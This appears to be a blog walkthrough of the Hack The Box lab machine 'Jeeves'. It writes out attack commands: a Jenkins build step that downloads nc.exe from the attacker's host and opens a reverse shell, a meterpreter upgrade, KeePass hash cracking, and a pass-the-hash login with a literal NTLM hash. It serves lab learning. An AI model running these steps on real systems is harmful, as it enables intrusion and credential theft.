---
title: "Jeeves Walkthrough(Hack The Box)"
date: 2025-04-07
draft: false
description: "a description"
tags: ["Medium", "Linux", "Hack The Box", "Hacking", "Web", "Walkthrough"]
---
## Reconnaissance #Windows 
- We got port 135, 80, 445 open as in initial scan.
- ![[Pasted image 20241215194409.png]]
- We got a web application page running with a search option for articles , and others too
- Its running on windows 10 and the search option leads to a error page surprisingly. Also it's a SQL error.
- ![[Pasted image 20241215145119.png]]
- We got server info from the error
- ![[Pasted image 20241215145414.png]]
- I have tried all the things to directory to host enumeration it all failed . The reason is I overlooked a port which is 50000. This port is also had a web page on it.
## Enumeration
- On doing directory enumeration I can a directory in the output
```
 ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://jeeves.htb:50000/FUZZ -t 60
```
- ![[Pasted image 20241215194726.png]]
- After accessing the directory I was so happy to see jenkins. Then I got access easily by injecting this command to download nc from my my machine on the project build.
## Exploitation
- `powershell -c "Invoke-WebRequest -Uri 'http://10.10.14.4:8000/nc.exe' -OutFile 'C:\Windows\Temp\good.exe'"`
- Executed it using next build command `C:\\Windows\Temp\good.exe <ip> <port> -e cmd.exe`
- Soon after getting user flag I tried this `whoami /priv` and saw seimpersonate token set enabled and tried some of the attacks from metasploit but failed.
- Initially to transfer this shell to meterpreter I used `exploit/multi/script/web_discovery` for the payload `windows/meterpreter/reverse_tcp` cause x64 was not working.
- This above module helped me to create a meterpreter shell by giving me a command to paste in the shell session I had.
- Soon after executing the command and got meterpreter access.
- As I didn't had any luck with potato attacks. I decided to check other directories and found a file in the Documents folder for our user. Which was CEH.kdbd.
- which is keepass db file so it required master key to unlock it.
- I used  john to generate hash and then hashcat to crack it.
```
keepass2john CEH.kdbd >> kdbd.hash
```
- Then..
```
hashcat kdbd.hash  /usr/share/wordlists/rockyou.txt --user -m 13400
```
- I used `--user` flag as hash started with name CEH.
- we got the password which is `<Redacted>`
- ![[Pasted image 20241215201728.png]]
- I opened the db using `kpcli --kdb CEH.kdbx` and provided master password when prompted
- Only a password hash sounded interesting to me
- ![[Pasted image 20241215201952.png]]
## Privilege Escalation
- I checked the hash sanity as Administrator to machine's share using crackmapexec and got a hit
```
crackmapexec smb 10.10.10.63 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
```
- ![[Pasted image 20241215202113.png]]
- Now using psexec.py I initiated pass the hash attack and to prompt shell
- `psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 administrator@10.10.10.63 cmd.exe`
- ![[Pasted image 20241215202422.png]]
- Administrator's Desktop folder had this hm.txt which said to look elsewhere for root flag but by issuing `dir /R` we got to see the alternate data streams for the files.
- ![[Pasted image 20241215202656.png]]
- To read the contents of the root flag I typed `more < hm.txt:root.txt`
- ![[Pasted image 20241215202910.png]]
